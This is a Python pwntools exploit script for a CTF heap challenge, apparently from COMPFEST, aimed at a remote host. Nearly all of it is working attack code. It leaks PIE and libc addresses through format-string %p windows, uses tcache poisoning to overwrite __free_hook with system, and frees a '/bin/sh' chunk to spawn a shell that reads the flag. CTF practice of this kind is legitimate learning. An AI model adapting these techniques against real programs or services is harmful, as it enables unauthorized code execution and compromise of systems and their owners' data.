#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF('./chall', checksec=False)
elf = context.binary
libc = ELF('./libc.so.6', checksec=False)

HOST = args.HOST or 'ctf.compfest.id'
PORT = int(args.PORT or 7001)

def start():
    if args.LOCAL:
        if args.LD:
            return process([args.LD, '--library-path', '.', './chall'])
        else:
            return process('./chall')
    else:
        return remote(HOST, PORT)

def recv_menu(io):
    return io.recvuntil(b'>> ')

def do_raise(io, seat, amount, note_bytes=None):
    recv_menu(io)
    io.sendline(b'1')
    io.recvuntil(b'Seat number:')
    io.sendline(str(seat).encode())
    io.recvuntil(b'Raise amount:')
    io.sendline(str(amount).encode())

    # Try: asks for note
    try:
        io.recvuntil(b'Add a note for this bet:', timeout=0.8)
        if note_bytes is None:
            note_bytes = b'A' * (amount - 1)
        io.send(note_bytes)
        io.send(b'\n')
        try: io.recvline(timeout=0.5)
        except Exception: pass
        return True
    except Exception:
        pass

    tail = b''
    for _ in range(2):
        try: tail += io.recvline(timeout=0.4)
        except Exception: break

    if b"minimum $10" in tail or b"Relax, that's too much." in tail or b"No such seat." in tail:
        return False
    return True

def do_peek(io, seat):
    recv_menu(io)
    io.sendline(b'2')
    io.recvuntil(b'Seat number:')
    io.sendline(str(seat).encode())
    out = io.recvuntil(b'>> ', drop=True)
    return out

def do_fold(io, seat):
    recv_menu(io)
    io.sendline(b'3')
    io.recvuntil(b'Seat number:')
    io.sendline(str(seat).encode())
    try: io.recvline(timeout=0.4)
    except Exception: pass
    return True

def build_positional_fmt(start_idx, max_len=120, end_cap=220):
    parts = []
    i = start_idx
    # keep adding until near max_len or idx limit
    while i <= end_cap:
        frag = f"%{i}$p|"
        if len("".join(parts)) + len(frag) > max_len:
            break
        parts.append(frag)
        i += 1
    s = "".join(parts)
    return s.encode(), i  # next start

def multi_window_leaks(io, seat=1, begin=1, end_cap=220):
    leaks = []
    idx = begin
    while idx <= end_cap:
        fmt, nxt = build_positional_fmt(idx, max_len=120, end_cap=end_cap)
        if not fmt: break
        amt = max(10, len(fmt)+1)
        if not do_raise(io, seat, amt, fmt):
            break
        out = do_peek(io, seat)
        leaks.extend(int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+', out))
        idx = nxt
    return leaks

def find_pie_base_from_ret(leaks):
    RET = 0x15ab
    for v in leaks:
        if (v & 0xfff) == (RET & 0xfff):
            return v - RET, v
    return None, None

def tcache_poison(io, size, target, seat=2):
    assert do_raise(io, seat, size, b'A'*(size-1))
    assert do_fold(io, seat)
    assert do_fold(io, seat)
    payload = p64(target) + b'B'*(size-1-8)
    assert do_raise(io, seat, size, payload)

def solve():
    io = start()

    # Wider scan for PIE using positional windows
    leaks = multi_window_leaks(io, seat=1, begin=1, end_cap=220)
    log.info("Scanned & collected %d leak candidates", len(leaks))

    pie, ret = find_pie_base_from_ret(leaks)
    if not pie:
        log.failure("Could not find PIE via 0x15ab signature; try increasing end_cap")
        io.close(); return
    elf.address = pie
    log.success(f"PIE base: {hex(elf.address)} (ret {hex(ret)})")

    # Heuristic libc leak: pick first 0x7f.. value and brute small deltas
    libc_like = next((v for v in leaks if (v >> 40) & 0xff == 0x7f), None)
    if not libc_like:
        log.failure("No libc-looking pointer (0x7f...) found in leaks")
        io.close(); return

    deltas = [0x0, 0x80, 0xa0, 0x120, 0x1a0, 0x1c0, 0x240, 0x2e0]
    for d in deltas:
        try:
            io2 = io if d == deltas[0] else start()
            libc.address = libc_like - (libc.symbols['__libc_start_main'] + d)
            log.warn(f"Trying libc base {hex(libc.address)} (delta {hex(d)})")
            free_hook = libc.symbols['__free_hook']
            system = libc.symbols['system']

            # tcache poison -> __free_hook
            tcache_poison(io2, size=32, target=free_hook, seat=2)

            # write system to hook
            note = p64(system) + b'\x00'*(31-8)
            assert do_raise(io2, seat=3, amount=32, note_bytes=note)

            # allocate '/bin/sh' and free
            sh = b"/bin/sh\x00"
            assert do_raise(io2, seat=4, amount=max(10, len(sh)+1), note_bytes=sh)
            do_fold(io2, seat=4)

            io2.sendline(b'cat flag* || cat /flag || /bin/sh -i')
            io2.interactive()
            return
        except Exception as e:
            log.warn(f"delta {hex(d)} failed: {e}")
            try: io2.close()
            except: pass

    log.failure("All libc deltas failed; raise end_cap or manually inspect leaks.")

# Diagnostics
def dump_windows():
    io = start()
    idx = 1
    while idx <= 220:
        fmt, nxt = build_positional_fmt(idx, max_len=120, end_cap=220)
        amt = max(10, len(fmt)+1)
        do_raise(io, 1, amt, fmt)
        out = do_peek(io, 1)
        vals = [int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+', out)]
        print(f"IDX {idx:>3}-{nxt-1:>3} : {len(vals):>3} vals  | first={vals[0] if vals else None}")
        idx = nxt
    io.close()

if __name__ == '__main__':
    if args.DUMPWIN:
        dump_windows()
    else:
        solve()
